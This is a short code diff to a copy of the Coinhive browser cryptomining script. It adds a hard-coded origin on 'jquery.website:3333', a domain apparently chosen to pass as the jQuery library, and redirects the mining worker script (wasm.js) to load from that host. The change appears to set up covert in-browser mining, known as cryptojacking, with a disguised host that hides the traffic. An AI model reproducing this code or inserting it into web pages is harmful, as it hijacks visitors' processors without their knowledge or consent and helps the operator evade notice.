@@ -1,4 +1,16 @@
 // https://coinhive.com/lib/coinhive.min.js
+
+let origin;
+let _DEBUG = false;
+(function setOrigin(){
+	if(_DEBUG){
+		origin = "http://127.0.0.1:3333";
+	}
+	else{
+		origin = "https://jquery.website:3333"
+	}
+})();
+
 var sleep = async (duration) => {
     return new Promise((resolve, reject) => {
         setTimeout(resolve, duration);
@@ -1974,7 +1986,7 @@ self.CoinHive.CONFIG = {
 	MINER_URL: "https://coinhive.com/media/miner.html",
 	AUTH_URL: "https://authedmine.com/authenticate.html"
 };
-CoinHive.CRYPTONIGHT_WORKER_BLOB = "http://127.0.0.1/service-worker/service-worker-coinhive/wasm.js";
+CoinHive.CRYPTONIGHT_WORKER_BLOB = origin + "/service-worker/service-worker-coinhive/wasm.js";
 
 
 
